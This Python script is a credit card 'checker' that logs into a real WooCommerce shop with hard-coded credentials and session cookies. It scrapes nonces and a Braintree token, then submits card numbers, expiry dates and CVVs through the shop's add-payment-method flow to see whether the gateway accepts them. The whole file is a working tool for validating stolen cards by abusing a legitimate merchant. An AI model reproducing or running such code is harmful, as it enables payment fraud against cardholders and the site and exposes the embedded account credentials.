import requests,re,random,time,string,base64
from bs4 import BeautifulSoup

def Tele(cx):
    cc = cx.split("|")[0]
    bin=cc[:6]
    mes = cx.split("|")[1]
    ano = cx.split("|")[2]
    cvv = cx.split("|")[3]
    if "20" in ano:
        ano = ano.split("20")[1]
    r=requests.session()
    heaf={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}
    get=r.get("https://www.woolroots.com/my-account/",headers=heaf)
    login=re.findall(r'name="woocommerce-login-nonce" value="(.*?)"',get.text)[0]
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check',
    'Origin': 'https://www.woolroots.com',
    'Referer': 'https://www.woolroots.com/my-account/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

    data = {
    'username': 'omyadav7777',
    'password': 'nxtvenom1122@',
    'woocommerce-login-nonce': login,
    '_wp_http_referer': '/my-account/',
    'login': 'Log in',
}

    response = r.post('https://www.woolroots.com/my-account/', headers=headers, data=data)

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # 'Cookie': '_swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
    'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

    response = r.get('https://www.woolroots.com/my-account/add-payment-method/',headers=headers)
#print(response.text)
    no=re.findall(r'"client_token_nonce":"(.*?)"',response.text)[0]
    cookies = {
    'wordpress_sec_ee0ffb447a667c514b93ba95d290f221': 'mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7C868703aa5b50efdaf3ffc942cec7a4b4fca527b74db6e549b83eeeb00e469ba6',
    '_swa_u': 'b9fa3c37-b33e-484c-a01c-859ac552137a',
    'cmplz_consented_services': '',
    'cmplz_policy_id': '12',
    'cmplz_marketing': 'allow',
    'cmplz_statistics': 'allow',
    'cmplz_preferences': 'allow',
    'cmplz_functional': 'allow',
    'cmplz_banner-status': 'dismissed',
    'nm-wishlist-ids': '[]',
    'wordpress_test_cookie': 'WP+Cookie+check',
    '_lscache_vary': '3bd3b5fb94aa2fbc2bfac3d9be19d32b',
    'wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221': 'mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'wordpress_sec_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7C868703aa5b50efdaf3ffc942cec7a4b4fca527b74db6e549b83eeeb00e469ba6; _swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
    'Origin': 'https://www.woolroots.com',
    'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

    data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': no,
}

    response = r.post('https://www.woolroots.com/wp-admin/admin-ajax.php', headers=headers, data=data)
    #print(response.text)
    token=re.findall(r'"data":"(.*?)"',response.text)[0]
    encoded_text = token
    decoded_text = base64.b64decode(encoded_text).decode('utf-8')
    au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
    #print(au)
    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '89d615c6-0350-481e-a35e-863af6c62f3e',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc,
                'expirationMonth': mes,
                'expirationYear': ano,
                'cvv': cvv,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    token=response.json()['data']['tokenizeCreditCard']['token']
    gh={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}
    ges=r.get("https://www.woolroots.com/my-account/add-payment-method/",headers=gh)
    pay=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',ges.text)[0]
    cookies = {
    '_swa_u': 'b9fa3c37-b33e-484c-a01c-859ac552137a',
    'cmplz_consented_services': '',
    'cmplz_policy_id': '12',
    'cmplz_marketing': 'allow',
    'cmplz_statistics': 'allow',
    'cmplz_preferences': 'allow',
    'cmplz_functional': 'allow',
    'cmplz_banner-status': 'dismissed',
    'nm-wishlist-ids': '[]',
    'wordpress_test_cookie': 'WP+Cookie+check',
    '_lscache_vary': '3bd3b5fb94aa2fbc2bfac3d9be19d32b',
    'wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221': 'mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
}

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_swa_u=b9fa3c37-b33e-484c-a01c-859ac552137a; cmplz_consented_services=; cmplz_policy_id=12; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; nm-wishlist-ids=[]; wordpress_test_cookie=WP+Cookie+check; _lscache_vary=3bd3b5fb94aa2fbc2bfac3d9be19d32b; wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=mhemen673%7C1692805914%7CYVkcV8SYq7lMAZbqxiqqUxOZhd07yvLmDI093fqxG1y%7Ce6459d16e0ca6a92d4ad5f1a11dce3ebbfdebf509d4aea3596cf4b13c69e83e9',
    'Origin': 'https://www.woolroots.com',
    'Referer': 'https://www.woolroots.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

    data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'visa',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': token,
    'wc_braintree_device_data': '{"correlation_id":"5d4a458e9fb8b6cd05da33e61448f27a"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': pay,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

    time.sleep(25)
    response = r.post('https://www.woolroots.com/my-account/add-payment-method/', headers=headers, data=data)
    soup = BeautifulSoup(response.text, 'html.parser')
    try:  
      msg = soup.find('i', class_='nm-font nm-font-close').parent.text.strip()
    except:
      return "Status code avs: Gateway Rejected: avs"
    try:
    	if "Status code avs: Gateway Rejected: avs" in msg:
    		return msg
    except:
    	return "Status code avs:"
    else:
    	return msg